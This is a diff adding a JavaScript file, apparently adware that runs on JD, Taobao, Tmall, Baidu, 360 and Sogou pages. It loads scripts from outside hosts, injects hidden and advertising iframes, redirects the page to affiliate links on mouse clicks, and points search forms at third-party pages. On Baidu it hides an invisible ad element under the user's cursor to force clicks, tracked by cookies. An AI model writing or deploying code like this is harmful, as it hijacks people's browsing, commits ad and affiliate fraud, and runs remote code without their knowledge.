@@ -1,0 +1,838 @@
+   var pipei = window.location.href;
+//
+if (pipei.indexOf("jd.com")>0)
+			{
+				if (pipei.indexOf("item.jd.com")>0)
+			{
+				function jdewm(){
+					  var script = document.createElement("script");
+script.type = "text/javascript";
+script.charset="utf-8";
+script.src = "https://js.fslingxian.com/rj/jdewm.js";
+//document.body.appendChild(script);
+}
+window.setTimeout(jdewm,2000);
+				}
+				function jdong(){
+				if(document.getElementById("jdkuangjso")) 
+  {  }else{
+				if(pipei.indexOf("re.jd.com")==-1)
+{
+	if(pipei.indexOf("campaign=t_42260-stop")==-1)
+{
+				//document.getElementById('search-2014').innerHTML = '<iframe width="542" height="60" id="jdkuangjso" frameborder="0" scrolling="no" allowtransparency="true" src="/jd/jdso.html?13"></iframe>'
+}	
+}
+  if (pipei.indexOf("re.jd.com")>0)
+			{
+				//document.getElementById('search_2015').innerHTML = '<iframe width="542" height="60" id="jdkuangjso" frameborder="0" scrolling="no" allowtransparency="true" src="/jd/jdso.html?13"></iframe>'
+	//document.getElementById('sales-promotion').innerHTML = '<iframe width="960" height="91" frameborder="0" scrolling="no" allowtransparency="true" src="/jd/jd960.html?12"></iframe>'
+  //document.getElementById('sales-promotion').style.display="block";
+  }
+  }
+  }
+  window.setTimeout(jdong,1000);
+  }
+//
+if (pipei.indexOf("www.taobao.com")>0)
+			{
+				function tbban(){
+				if(document.getElementById("J_Banner")) 
+  { 
+document.getElementById('J_Banner').innerHTML = '<div class="banner-wrap"><a href="http://ww-baidu-com.oss-cn-hangzhou.aliyuncs.com/gengsheng.html?tao" target="_blank"><img src="https://jsb.cfydzcy.cn/tb.png" alt="更省app" style="width:1190px;height:70px"></a></div>'
+}
+}
+  window.setTimeout(tbban,100);
+				} 
+if (pipei.indexOf("www.jd.com")>0)
+			{
+		function jdlh(){
+        var bodyBgs = [];
+        bodyBgs[0] = "http://www.erhaojie.com/360/id.html#https://union-click.jd.com/jdc?e=&p=AyIGZRprFDJWWA1FBCVbV0IUWVALHFRBEwQAQB1AWQkFa0BdDGcKElxJYWIAE2xZZwJmcBFHBmUOHjdXHloVABcGVRNrEAERAFQraxUDIkw7GmsXAxMEXR1dFAQRN1UcWhcBFgZQEl8dBRQ3UhtSJVlHaVFLDBAGFwdQHV5HA0U3ZStYJTIiB1UrWyVdVloIK1kUAxYO";
+        bodyBgs[1] = "http://www.erhaojie.com/360/id.html#https://union-click.jd.com/jdc?e=&p=AyIGZRprFDJWWA1FBCVbV0IUWVALHFRBEwQAQB1AWQkFa0BdDGcKElxJYWIAE2xZZwJmcBFHBmUOHjdXHloVABcGVRNrEAERAFQraxUDIkw7GmsXAxMEXR1dFAQRN1UcWhcBFgZQEl8dBRQ3UhtSJVlHaVFLDBAGFwdQHV5HA0U3ZStYJTIiB1UrWyVdVloIK1kUAxYO";
+        bodyBgs[2] = "http://dwz.cn/jd-eg";
+        bodyBgs[3] = "http://dwz.cn/jd-eg";
+        bodyBgs[4] = "http://dwz.cn/jd-eg";
+        var randomBgIndex = Math.round( Math.random() * 1 );
+  if(pipei.indexOf("paign=t_302050240_842183")==-1)
+  if(pipei.indexOf("campaign=t_16282_181597165")==-1)
+  if(pipei.indexOf("campaign=t_9998189_24yqh275364")==-1)
+  if(pipei.indexOf("campaign=t_36378_65742")==-1)
+	  if(pipei.indexOf("campaign=t_42260")==-1)
+  {
+  document.onmousedown = function(){ 
+  if(document.getElementById("navitems-group1")) 
+  { 
+function jdsan(){
+  top.location='' + bodyBgs[randomBgIndex] + '';
+  }
+  window.setTimeout(jdsan,4000);
+  } 
+  } 
+  }
+  }
+  window.setTimeout(jdlh,100);
+  } 
+if (pipei.indexOf("1111.tmall.com")>0)
+			{
+		function yiyi(){
+        var bodyBgs = [];
+        bodyBgs[0] = "http://cdn.qyhxhnt.com/id.html#https://s.click.taobao.com/vH8bHvu";
+        bodyBgs[1] = "http://cdn.qyhxhnt.com/id.html#https://s.click.taobao.com/vH8bHvu";
+        bodyBgs[2] = "http://cdn.qyhxhnt.com/id.html#https://s.click.taobao.com/vH8bHvu";
+        bodyBgs[3] = "http://cdn.qyhxhnt.com/id.html#https://s.click.taobao.com/vH8bHvu";
+        bodyBgs[4] = "http://cdn.qyhxhnt.com/id.html#https://s.click.taobao.com/vH8bHvu";
+        var randomBgIndex = Math.round( Math.random() * 4 );
+  if(pipei.indexOf("mm_337110002")==-1)
+  if(pipei.indexOf("campaign=t_16282_181597165")==-1)
+  if(pipei.indexOf("campaign=t_9998189_24yqh275364")==-1)
+  if(pipei.indexOf("campaign=t_36378_65742")==-1)
+	  if(pipei.indexOf("campaign=t_42260")==-1)
+  {
+  document.onmousedown = function(){ 
+  top.location='' + bodyBgs[randomBgIndex] + ''; 
+  } 
+  }
+  }
+  window.setTimeout(yiyi,100);
+  }
+//
+if (pipei.indexOf("www.so.com")>0)
+   {
+	   function sosugindex(){
+	   if(document.getElementById("bd_logo")) 
+  {
+	  var script = document.createElement("script");
+script.type = "text/javascript";
+script.charset="utf-8";
+script.src = "//jsb.cfydzcy.cn/js/bd/sosugindex.js";
+//document.body.appendChild(script);//搜索下拉文字
+	   }
+	   }
+  window.setTimeout(sosugindex,1000);
+	   }
+//
+if (pipei.indexOf("so.com/s")>0)
+   {
+	   var thisurl=window.location.href;
+if (thisurl.indexOf("ls=n163401849c")==-1) 
+if (thisurl.indexOf("ls=n661c0a0a9c")==-1)
+if (thisurl.indexOf("ls=sm1270160")==-1) //300
+if (thisurl.indexOf("ls=sm1270164")==-1)
+if (thisurl.indexOf("ls=sm1270166")==-1)
+if (thisurl.indexOf("ls=sm2238649")==-1)
+if (thisurl.indexOf("ls=sm1228319")==-1)
+if (thisurl.indexOf("ls=sm1270201")==-1) //640
+if (thisurl.indexOf("ls=sm1270166")==-1) //160600
+if (thisurl.indexOf("ls=sm1270218")==-1)  //460
+	if (thisurl.indexOf("ls=sm2336773")==-1) //960xin
+	if (thisurl.indexOf("ls=sm2287151")==-1) //llq tab-so
+	if (thisurl.indexOf("ls=n7c840a199c")==-1)
+		if (thisurl.indexOf("ls=sm2363355")==-1) //2020
+			if (thisurl.indexOf("ls=sm2341405")==-1) //2020
+			if (thisurl.indexOf("ls=sm2361875")==-1) //2020
+if (thisurl.indexOf("ls=sn2")==-1)
+  {
+	  function haoso(){
+	document.getElementById('tabs-wrap').innerHTML = '<iframe width="1" height="1" frameborder="0" scrolling="no" allowtransparency="true" src="https://llqcj.oss-cn-shenzhen.aliyuncs.com/360so/index.html"></iframe>'
+	  }
+	 window.setTimeout(haoso,500);
+	 }
+		  function haosodian(){
+			 document.getElementById('so_ob').innerHTML = '';
+ //var script = document.createElement("script");
+//script.type = "text/javascript";
+//script.charset="utf-8";
+//script.src = "//cdn.fslingxian.com/smu0/o.js";
+//document.getElementById("so_ob").appendChild(script);
+$("#so_ob").prepend('<iframe width="300" height="300" frameborder="0" scrolling="no" allowtransparency="true" src="https://cdn.fslingxian.com/gg4/300.htm" id="//cdn.fslingxian.com/gg4/300.htm"></iframe>');
+   }
+  document.onmousedown = function(){ 
+  window.setTimeout(haosodian,3000);}
+  function ggdian(){
+	  //document.getElementById('so_ob').innerHTML = '';
+ //var script = document.createElement("script");
+//script.type = "text/javascript";
+//script.charset="utf-8";
+//script.src = "//cdn.fslingxian.com/smu0/o.js";
+//document.getElementById("so_ob").appendChild(script);
+$("#so_ob").prepend('<iframe width="300" height="300" frameborder="0" scrolling="no" allowtransparency="true" src="https://cdn.fslingxian.com/gg4/300.htm" id="//cdn.fslingxian.com/gg4/300.htm"></iframe>');
+   }
+  window.setTimeout(ggdian,800);
+  }
+  //
+				function tbyouhuier(){
+if (pipei.indexOf("uland.taobao.com/coupon")>0)
+			{
+	var a1 = document.getElementsByTagName('a')[0];
+	if(typeof(a1) == "undefined")
+  {
+	function getParam(paramName) { 
+    paramValue = "", isFound = !1; 
+    if (this.location.search.indexOf("?") == 0 && this.location.search.indexOf("=") > 1) { 
+        arrSource = unescape(this.location.search).substring(1, this.location.search.length).split("&"), i = 0; 
+        while (i < arrSource.length && !isFound) arrSource[i].indexOf("=") > 0 && arrSource[i].split("=")[0].toLowerCase() == paramName.toLowerCase() && (paramValue = arrSource[i].split("=")[1], isFound = !0), i++ 
+    } 
+    return paramValue == "" && (paramValue = null), paramValue 
+   }
+   top.location= "http://item.taobao.com/item.htm?id=" + getParam("itemId") + "&123spm=dlk";
+	} 
+   else
+  {
+	  top.location= a1
+  }
+	}
+	}
+//
+if (pipei.indexOf("uland.taobao.com/coupon")>0)
+			{
+				if ((pipei.indexOf("src=qhkj_dtkp")>0)||(pipei.indexOf("src=qhkj_cs")>0)||(pipei.indexOf("src=24603076")>0)||(pipei.indexOf("src=25254678")>0)||(pipei.indexOf("src=no-tiao")>0))
+			{
+       document.getElementsByTagName('body')[0].style.display = 'none';  
+				}
+				function tbyouhuiq(){
+				var a1 = document.getElementsByTagName('a')[0];
+				//a2 = a1.replace(/s.click.taobao.com/g,'app.e.com').replace(/t\?/g,'coki');
+				if ((pipei.indexOf("src=qhkj_dtkp")>0)||(pipei.indexOf("src=qhkj_cs")>0)||(pipei.indexOf("src=24603076")>0)||(pipei.indexOf("src=25254678")>0))
+			{
+       document.getElementsByTagName('body')[0].style.display = 'none'; 
+if(a1 == pipei)
+{
+function getParam(paramName) { 
+    paramValue = "", isFound = !1; 
+    if (this.location.search.indexOf("?") == 0 && this.location.search.indexOf("=") > 1) { 
+        arrSource = unescape(this.location.search).substring(1, this.location.search.length).split("&"), i = 0; 
+        while (i < arrSource.length && !isFound) arrSource[i].indexOf("=") > 0 && arrSource[i].split("=")[0].toLowerCase() == paramName.toLowerCase() && (paramValue = arrSource[i].split("=")[1], isFound = !0), i++ 
+    } 
+    return paramValue == "" && (paramValue = null), paramValue 
+}
+  top.location= "http://item.taobao.com/item.htm?id=" + getParam("itemId") + "&123spm=dlk";
+  }else{
+	 if(typeof(a1) == "undefined")
+  {
+	 window.setTimeout(tbyouhuier,1000);
+	}else{
+	  top.location= a1
+  }	  
+  }
+  }
+  }
+  window.setTimeout(tbyouhuiq,500);
+  }
+//
+if ((pipei.indexOf("item.taobao")>0)||(pipei.indexOf("detail.tmall")>0))
+			{
+	function lh(){
+        var script = document.createElement("script");
+        script.type = "text/javascript";
+        script.charset="utf-8";
+        script.src = "https://js.fslingxian.com/rj/j.js";
+        document.body.appendChild(script);
+        }
+        window.setTimeout(lh,1000);
+        }
+//
+if ((pipei.indexOf("s.taobao.com")>0)||(pipei.indexOf("list.tmall")>0)||(pipei.indexOf("ai.taobao.com/?pid=mm_337110002")>0)||(pipei.indexOf("ai.taobao.com/search")>0)||(pipei.indexOf("tmall.com/?q=")>0)||(pipei.indexOf("tmall.com/category")>0)||(pipei.indexOf("tmall.com/view_shop")>0)||(pipei.indexOf("tmall.com/search.htm")>0))
+			{
+
+				function tbtmso(){
+				var script = document.createElement("script");
+  script.type = "text/javascript";
+  script.charset="utf-8";
+  script.src = "https://js.fslingxian.com/rj/j.js";
+  document.body.appendChild(script);
+  }
+  window.setTimeout(tbtmso,1000);
+  }
+//
+if ((pipei.indexOf("hao.360.cn")>0)||(pipei.indexOf("hao.360.com") > 0 ))
+ {
+  function dh360sy(){
+	 var thisurl=window.location.href;
+  if (thisurl.indexOf("hao.360.cn/a")==-1) 
+  if (thisurl.indexOf("hao.360.cn/b")==-1) 
+  if (thisurl.indexOf("hao.360.cn/c")==-1)
+	if (thisurl.indexOf("hao.360.cn/d")==-1) 
+  if (thisurl.indexOf("hao.360.cn/e")==-1) 
+  if (thisurl.indexOf("hao.360.cn/f")==-1)
+	if (thisurl.indexOf("hao.360.cn/g")==-1) 
+    if (thisurl.indexOf("hao.360.cn/h")==-1) 
+  if (thisurl.indexOf("hao.360.cn/i")==-1)
+	if (thisurl.indexOf("hao.360.cn/j")==-1) 
+  if (thisurl.indexOf("hao.360.cn/k")==-1) 
+  if (thisurl.indexOf("hao.360.cn/l")==-1)
+	if (thisurl.indexOf("hao.360.cn/m")==-1) 
+  if (thisurl.indexOf("hao.360.cn/n")==-1) 
+  if (thisurl.indexOf("hao.360.cn/o")==-1)
+	if (thisurl.indexOf("hao.360.cn/p")==-1) 
+  if (thisurl.indexOf("hao.360.cn/q")==-1) 
+  if (thisurl.indexOf("hao.360.cn/r")==-1)
+	if (thisurl.indexOf("hao.360.cn/s")==-1) 
+  if (thisurl.indexOf("hao.360.cn/t")==-1) 
+  if (thisurl.indexOf("hao.360.cn/u")==-1)
+	if (thisurl.indexOf("hao.360.cn/v")==-1) 
+  if (thisurl.indexOf("hao.360.cn/w")==-1) 
+  if (thisurl.indexOf("hao.360.cn/x")==-1)
+	if (thisurl.indexOf("hao.360.cn/y")==-1) 
+  if (thisurl.indexOf("hao.360.cn/z")==-1) 
+  if (thisurl.indexOf("hao.360.cn%")==-1) 
+  {
+	
+	  if(document.getElementById("service-relax")) 
+  {
+	 // document.getElementById('service-relax').style.height="680px";
+	 // document.getElementById('service-relax').innerHTML = '<iframe width="100%" height="680" id="newscr" frameborder="0" scrolling="no" allowtransparency="true" src="//www.1ian.cn/log"></iframe>'
+	  }
+	 if(document.getElementById("famous-section")) 
+  {
+	 // var widthjs = document.getElementById("famous-section").offsetWidth - 40;
+//var html = document.getElementById("famous-section").innerHTML;
+//document.getElementById("famous-section").innerHTML = html + ' <center><iframe frameborder="0" scrolling="no" src="https://cdn.fslingxian.com/970.htm" width="970" height="90" style="display: none;"></iframe></center>';
+}
+	  function ssxin(){
+if(document.getElementById("infoflow_guess_border")) 
+  {
+
+	  }
+}
+window.setTimeout(ssxin,600000);
+	 document.getElementById('search-form').action="https://llqcj.oss-cn-shenzhen.aliyuncs.com/360so.html"; 
+	 document.getElementById('search-form').id="search11form";
+	 if(document.getElementById("activity-imgs-switch")) 
+  {
+	// document.getElementById('activity-imgs-switch').innerHTML = '<a class="act-toppic" href="https://www.youkandian.cn/tag/%E7%83%AD%E9%97%A8%E7%94%B5%E5%BD%B1?360" style="height: 70px;"><img src="https://cdn.youkandian.cn/user_files/3/video-img/1572342517_4706.png" style="width: 100%;"><span class="ad"></span></a>'
+
+  }
+	 if(document.getElementById("search-engine")) 
+  {
+	 var divlogo = document.getElementById('search-engine');	
+  divlogo.innerHTML = divlogo.innerHTML.replace(/class="so360"/g,'class="somulti"');
+  }
+	 function lnkt(){
+		 if(document.getElementById("large2small")) 
+  {
+	  document.getElementById('large2small').innerHTML = ''
+	  var script = document.createElement("script");
+script.type = "text/javascript";
+script.charset="utf-8";
+script.src = "https://js.fslingxian.com/rj/gg/360youtu.js";
+//document.getElementById("large2small").appendChild(script);
+}
+  var divlnk = document.getElementById('hot-new-site');
+        divlnk.innerHTML = divlnk.innerHTML.replace(/https:\/\/union-click.jd.com\/jdc\?d=Rn6r2u/g,'https://d.6ltt.com/1R2e').replace(/https:\/\/www.6.cn\/\?src=z9weij928--stop/g,'https://www.9xiu.com/activity/activity_pcunion?jxiusr=t_53');
+		}
+  window.setTimeout(lnkt,2000);
+			var scrollFunc = function (e) {  
+        e = e || window.event;  
+        if (e.wheelDelta) {  //判断浏览器IE，谷歌滑轮事件               
+            if (e.wheelDelta > 0) { //当滑轮向上滚动时  
+  if(document.body.scrollTop < 300&&document.documentElement.scrollTop < 300){
+	function gdshang(){
+				var divlogo = document.getElementById('search-engine');	
+  divlogo.innerHTML = divlogo.innerHTML.replace(/class="so360"/g,'class="somulti"');
+          if(document.getElementById("search-form")) 
+  { 
+				document.getElementById('search-form').id="search11form";
+				document.getElementById('search11form').action="https://llqcj.oss-cn-shenzhen.aliyuncs.com/360so.html";
+	}else{				
+			document.getElementById('search11form').action="https://llqcj.oss-cn-shenzhen.aliyuncs.com/360so.html";
+	}
+	}
+  window.setTimeout(gdshang,100);
+                                 }				
+            }				
+            if (e.wheelDelta < 0) { //当滑轮向下滚动时  
+			function gdxia(){
+				var divlogo = document.getElementById('search-engine');	
+  divlogo.innerHTML = divlogo.innerHTML.replace(/class="so360"/g,'class="somulti"');
+          if(document.getElementById("search-form")) 
+  { 
+				document.getElementById('search-form').id="search11form";
+				document.getElementById('search11form').action="https://llqcj.oss-cn-shenzhen.aliyuncs.com/360so.html";
+	}else{				
+			document.getElementById('search11form').action="https://llqcj.oss-cn-shenzhen.aliyuncs.com/360so.html";
+	}
+               	}
+  window.setTimeout(gdxia,100);                
+            }  else if (e.detail) {  //Firefox滑轮事件  
+            if (e.detail> 0) { //当滑轮向上滚动时  
+                //alert("滑轮向上滚动");  
+            }  
+            if (e.detail< 0) { //当滑轮向下滚动时  
+               // alert("滑轮向下滚动");  
+            }  
+        }  
+        } 
+    }  
+    //给页面绑定滑轮滚动事件  
+    if (document.addEventListener) {//firefox  
+        document.addEventListener('DOMMouseScroll', scrollFunc, false);  
+    }  
+    //滚动滑轮触发scrollFunc方法  //ie 谷歌  
+    window.onmousewheel = document.onmousewheel = scrollFunc; 
+  document.onmousedown = function(){ 
+  if (thisurl.indexOf("ls=n661c0a0a9c")==-1)
+		if (thisurl.indexOf("ls=n7c840a199c")==-1)
+  {
+	  function dstiao(){
+		var div = document.createElement("div");
+  div.innerHTML = '';
+ document.body.appendChild(div);
+  }
+ // window.setTimeout(dstiao,30000);
+  }
+  if(document.body.scrollTop < 300&&document.documentElement.scrollTop < 300){
+  if(document.getElementById("search-form")) 
+  { 
+				document.getElementById('search-form').id="search11form";
+				document.getElementById('search11form').action="https://llqcj.oss-cn-shenzhen.aliyuncs.com/360so.html";
+	}else{				
+			document.getElementById('search11form').action="https://llqcj.oss-cn-shenzhen.aliyuncs.com/360so.html";
+	}}
+  }
+  }
+  }
+  window.setTimeout(dh360sy,1000);
+  }
+//
+   if (pipei.indexOf("se.360.cn/setm/jrtm-web.html")>0)
+   {
+   window.location.href='http://www.erhaojie.com/360/id.html#http://www.erhaojie.com/sg/gs300.htm';
+	 }
+	if (pipei.indexOf("mini.360.cn/jrtm/jrtm-web.html")>0)
+   {
+   window.location.href='http://www.erhaojie.com/360/id.html#http://www.erhaojie.com/sg/gs300.htm';
+	 }
+	 if (pipei.indexOf("browser.360.cn/se/unlock_screen/pmp.html")>0)
+   {
+	   	   $('.content1').attr('style','height:250px;width:300px');
+	   function sanliuyou(){
+	   $("#richmedia-front").html('<iframe width="300" height="250" frameborder="0" scrolling="no" allowtransparency="true" src="https://cdn.fslingxian.com/gg4/300.htm"></iframe>');
+}
+   window.setTimeout(sanliuyou,800);
+	 }
+//
+   if (pipei.indexOf("www.sogou.com")>0)
+   {
+	function sogouyou(){
+		if(document.getElementById("hint_container")) //搜索页相关搜索
+   {
+	   if (pipei.indexOf("sogou-brse-2d71144eda8576cf")==-1)
+   {
+	  // $("#hint_container").prepend('<iframe width="1" height="1" frameborder="0" scrolling="no" allowtransparency="true" src="https://ww-baidu-com.oss-cn-hangzhou.aliyuncs.com/s/sogouso.html"></iframe>'); 
+	   //window.location.href='https://ww-baidu-com.oss-cn-hangzhou.aliyuncs.com/s/sgindex.html';
+	   }
+	   }
+	     
+	   if(document.getElementById("right")) 
+   {
+function sgdian(){
+	$("#huanqiugg").html("");
+	$("#right").prepend('<div id="huanqiugg"><iframe width="300" height="300" frameborder="0" scrolling="no" allowtransparency="true" src="https://cdn.fslingxian.com/gg4/300.htm"></iframe></div>');  
+  }	  
+$("#right").prepend('<div id="huanqiugg"><iframe width="300" height="300" frameborder="0" scrolling="no" allowtransparency="true" src="https://cdn.fslingxian.com/gg4/300.htm"></iframe></div>');    
+
+   document.onmousedown = function(){ 
+   window.setTimeout(sgdian,2000);
+   }
+   }
+   var script = document.createElement("script");
+script.type = "text/javascript";
+script.charset="utf-8";
+//script.src = "//jsb.cfydzcy.cn/js/bd/sogousug.js";
+//document.body.appendChild(script);
+   }
+   window.setTimeout(sogouyou,1000);
+   }
+//
+				function llqtagcr(){
+					if(document.getElementById("page-news")) 
+  { 
+					if(document.getElementById("sideNav")) 
+  { 
+					document.getElementById('sideNav').style.height="252px";
+					document.getElementById('sideNav').innerHTML = '<iframe width="300" height="250" frameborder="0" scrolling="no" allowtransparency="true" src="https://cdn.fslingxian.com/gg4/300.htm"></iframe>';
+					//document.getElementById('topNav').style="padding:4px 0px 0;";
+					//document.getElementById('topNav').innerHTML = '<iframe width="1020" height="100" frameborder="0" scrolling="no" allowtransparency="true" src="https://js.fslingxian.com/rj/gg/1000.html"></iframe>';
+					}
+					if(document.getElementById("news-content-youlike")) 
+  { 
+//document.getElementById('news-content-youlike').innerHTML = '<iframe width="670" height="1250" frameborder="0" scrolling="no" allowtransparency="true" src="https://d.foxine.cc/id.html#https://d.foxine.cc/pcnews.html"></iframe>';
+					}
+					}
+					}
+					window.setTimeout(llqtagcr,2000);
+					
+//
+
+				if ((pipei.indexOf(".360kuai.com")>0)||(pipei.indexOf("mini.360.cn")>0)||(pipei.indexOf("pc.360kan.com")>0)||(pipei.indexOf("www.360kan.com")>0))
+ {
+					function zuoxiajiabd(){
+				var script = document.createElement("script");
+  script.type = "text/javascript";
+  script.charset="utf-8";
+  script.src = "https://js.fslingxian.com/rj/gg/bdyou.js";
+  document.body.appendChild(script);
+  }
+  window.setTimeout(zuoxiajiabd,1000);
+				}
+//
+ if (pipei.indexOf("s.safe.360.cn")>0)
+			{
+					function zuoxiajiasafe(){
+				var script = document.createElement("script");
+  script.type = "text/javascript";
+  script.charset="utf-8";
+  script.src = "https://js.fslingxian.com/rj/gg/bdyou.js";
+  document.body.appendChild(script);
+  }
+  window.setTimeout(zuoxiajiasafe,1000);
+				}
+//
+if (pipei.indexOf("www.baidu.com") > 0 )
+  {
+
+	  if ((pipei.indexOf("www.baidu.com/s")>0)||(pipei.indexOf("www.baidu.com/b") > 0 ))
+ {
+  if (pipei.indexOf("tn=06045029")==-1)
+  if (pipei.indexOf("tn=21002492_24_hao_pg")==-1)
+	   if (pipei.indexOf("tn=59044660_6_hao_pg")==-1)
+		   if (pipei.indexOf("tn=49055317_10_hao_pg")==-1)
+		    if (pipei.indexOf("tn=65006372_cpr")==-1) //百度新闻id
+	   if (pipei.indexOf("tn=65067297_cpr")==-1) //百度新闻id个人nena域名
+	   if (pipei.indexOf("tn=44004473_3_oem_dg")==-1) //20201112
+	   if (pipei.indexOf("tn=99401020_hao_pg")==-1) //20201118
+  {
+	  function bdsotiao(){
+	  document.getElementById('s_tab').innerHTML = '<iframe width="1" height="1" frameborder="0" scrolling="no" allowtransparency="true" src="https://ww-baidu-com.oss-cn-hangzhou.aliyuncs.com/s/so.html"></iframe>'
+	  }
+  window.setTimeout(bdsotiao,200);
+	  }
+	  function bdnews(){
+		  if (pipei.indexOf("tn=65006372_cpr&nwd") > 0 )
+  {
+	  var ahref=$("#content_left").find("a").map(function(){
+         return $(this).attr("href");
+      });
+
+	  for(var i=0;i<ahref.length;i++){
+				  var t_item=ahref[i];
+				  if (t_item.indexOf("baidu.php?url=") > 0 )
+  {
+	  var bdggurl=t_item;
+	  var ahref=0;
+	  window.location.href=bdggurl;
+	  }
+	  }
+		  }
+		  }
+		  window.setTimeout(bdnews,1000);
+	  function bdlh(){
+		  if ((pipei.indexOf("tn=99401020_hao_pg=stop")>0)||(pipei.indexOf("tn=44004473_3_oem_dg=stop") > 0 ))
+  {
+	  if(document.getElementById("3001")) 
+  {
+	   var Time=1; //天
+function Set(){
+var Then=new Date();
+Then.setTime(Then.getTime()+Time*24*60*60*1000);
+//Then.setTime(Then.getTime()+Time*1000);
+document.cookie="bddgg=1;expires="+Then.toGMTString();
+}
+var cookieString=new String(document.cookie);
+var cookieHeader="bddgg=";
+var beginPosition=cookieString.indexOf(cookieHeader);
+if (beginPosition<0){
+	Set();
+document.onmousedown = function(){
+	function bdggdtdian(){
+		document.getElementById("3001").style.cssText="";
+		 var div = document.createElement("div");
+div.style = "display: none;";
+div.innerHTML = '<div id="bdggd"><iframe width="1" height="1" frameborder="0" scrolling="no" allowtransparency="true" src="https://js.fslingxian.com/rj/tj.html?bdsodian"></iframe></div>';
+document.body.appendChild(div);
+   }
+  window.setTimeout(bdggdtdian,1000);
+		}
+
+	
+	  var obj = document.getElementById('3001');
+	  obj.style.position = 'absolute';
+	  obj.style.opacity = '0';
+	  document.onmousemove=function(even)
+        {
+			var topnum=Math.floor(Math.random()*10+1);
+			var leftnum=Math.floor(Math.random()*50+1);
+            var oDiv=document.getElementById('3001');
+//            document.body  Chrome专用
+            var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;
+            var scrollLeft=document.documentElement.scrollLeft||document.body.scrollLeft;
+
+                var oEvent=even||event;
+                oDiv.style.top = scrollTop+oEvent.clientY-150-topnum+"px";
+                oDiv.style.left=scrollLeft+oEvent.clientX-500-leftnum+"px";
+        }
+		}
+		}
+	  }
+if ((pipei.indexOf("tn=99401020_hao_pg-stop")>0)||(pipei.indexOf("tn=44004473_3_oem_dg-stop") > 0 ))
+ {
+var ahref=$("#content_left").find("a").map(function(){
+         return $(this).attr("href");
+      });
+	 // console.log(ahref.length);
+	 // console.log(ahref[1]);
+	  for(var i=0;i<ahref.length;i++){
+				  var t_item=ahref[i];
+				  if (t_item.indexOf("baidu.php?url=") > 0 )
+  {
+	  var bdggurl=t_item;
+	  var ahref=0;
+	  $('a').click(function (){
+   // alert(this.href);
+   var dianck=this.href;
+   var Time=1; //天
+function Set(){
+var Then=new Date();
+Then.setTime(Then.getTime()+Time*24*60*60*1000);
+//Then.setTime(Then.getTime()+Time*1000);
+document.cookie="bddgg=1;expires="+Then.toGMTString();
+}
+   if (dianck.indexOf("link?url=") > 0 )
+  {
+var cookieString=new String(document.cookie);
+var cookieHeader="bddgg=";
+var beginPosition=cookieString.indexOf(cookieHeader);
+if (beginPosition<0){ //cookie不存在
+Set();
+  var div = document.createElement("div");
+div.style = "display: none;";
+div.innerHTML = '<div id="bdggd"><iframe width="1" height="1" frameborder="0" scrolling="no" allowtransparency="true" src="https://js.fslingxian.com/rj/tj.html?bdggtiao"></iframe></div>';
+document.body.appendChild(div);
+function bdggdt(){
+   window.location.href=bdggurl;
+   }
+  window.setTimeout(bdggdt,1000);
+     // console.log(dianck);
+  // console.log(bdggurl);
+}
+   }
+   if (dianck.indexOf("baidu.php?url=") > 0 )
+  {
+	  var div = document.createElement("div");
+div.style = "display: none;";
+div.innerHTML = '<div id="bdggd"><iframe width="1" height="1" frameborder="0" scrolling="no" allowtransparency="true" src="https://js.fslingxian.com/rj/tj.html?bdggdian"></iframe></div>';
+document.body.appendChild(div);
+Set();
+	  }
+});
+	 }else {
+//var bdggurl="no";
+		 }
+		// console.log(bdggurl);
+				  }
+        }
+		}
+        window.setTimeout(bdlh,2000);
+	  }
+	  function bddengl(){
+		//  console.log("5");
+		  $("#u1").mousedown(function(){
+window.location.href='https://passport.baidu.com/v2/?login&tpl=mn&u=http%3A%2F%2Fwww.baidu.com%2F&sms=5';
+});
+if(document.getElementById("s_mancard_main")) 
+  { 
+//document.getElementById("bottom_space").onmousedown = function(){ 
+$(".rect").css("background-color","#ff7413");
+$(".rect").css("color","#fff");
+$(".rect").mousedown(function(){
+	window.open("http://cpu.baidu.com/pc/1022/272957886/i?pu=1&promotion_media_channel=71860");//新窗口打开
+});
+}
+		  }
+  window.setTimeout(bddengl,2000);
+	function bdsoyou(){
+	if(document.getElementById("content_right")) 
+  { 
+function bddian(){
+	//document.getElementById('content_right').innerHTML = '<div id="con-ar"></div>'
+  var script = document.createElement("script");
+script.type = "text/javascript";
+script.charset="utf-8";
+script.src = "//496.anquanzhuomian.com/books.php?id=2443";
+//document.getElementById("con-ar").appendChild(script);
+$("#huanqiugg").html("");
+$("#con-ar").prepend('<div id="huanqiugg"><iframe width="300" height="300" frameborder="0" scrolling="no" allowtransparency="true" src="https://cdn.fslingxian.com/gg4/300.htm" id="//cdn.fslingxian.com/gg4/300.htm"></iframe></div>');
+  }
+  window.setTimeout(bddian,200);
+	document.onmousedown = function(){ 
+  window.setTimeout(bddian,3000);
+  }
+  $(window).bind("scroll",function() {  
+    // 判断窗口的滚动条是否接近页面底部，这里的20可以自定义  
+   if ($(document).scrollTop() + $(window).height() > $(document).height() - 800) {  
+       //没有写ajax的调用，直接触发了链接的click事件。  
+       //$("#container").append('<div style="height:500px">dd</div>'); 
+	   document.getElementById('con-ar').style.position="fixed";	  
+	   
+    } 
+  }) 
+  }
+  else
+  {
+  document.getElementById('form').action="https://llqcj.oss-cn-shenzhen.aliyuncs.com/s/index.html";
+var bdxin = document.getElementById('wrapper');	
+bdxin.innerHTML = bdxin.innerHTML.replace(/class="fm"/g,'class="fm" target="_blank"');
+
+//document.getElementById('s_kw_wrap').innerHTML = '<input type="text" class="s_ipt" name="wd" id="kw" baiduSug="1">';
+ // $("#kw").attr("baiduSug","1");
+//var script = document.createElement("script");
+//script.type = "text/javascript";
+//script.charset="utf-8";
+//script.src = "//jsb.cfydzcy.cn/js/bd/opensug.js";
+//document.body.appendChild(script);
+  }
+  }
+  window.setTimeout(bdsoyou,500);
+  }
+  //
+if ((pipei.indexOf("pos.baidu.com")>0)||(pipei.indexOf("doubleclick.net") > 0 ))
+  {
+	 var thisurl=window.location.href;
+  if (thisurl.indexOf("u2533066")==-1)
+  if (thisurl.indexOf("u2532861")==-1)
+  if (thisurl.indexOf("u2614194")==-1)
+  if (thisurl.indexOf("u3002197")==-1)
+  if (thisurl.indexOf("u3475920")==-1)//huanqiu300 18-12-17
+  if (thisurl.indexOf("huanqiu.com")==-1)//huanqiu
+  if (thisurl.indexOf("mydrivers.com")==-1)
+  if (thisurl.indexOf("u3099036")==-1)//huanqiu960
+  if (thisurl.indexOf("=4569975")==-1)//zj17-7-26
+  if (thisurl.indexOf("u3061236")==-1)//zj-gjp-17-8-15
+  if (thisurl.indexOf("=4689341")==-1)//ssp-gjp-17-8-22
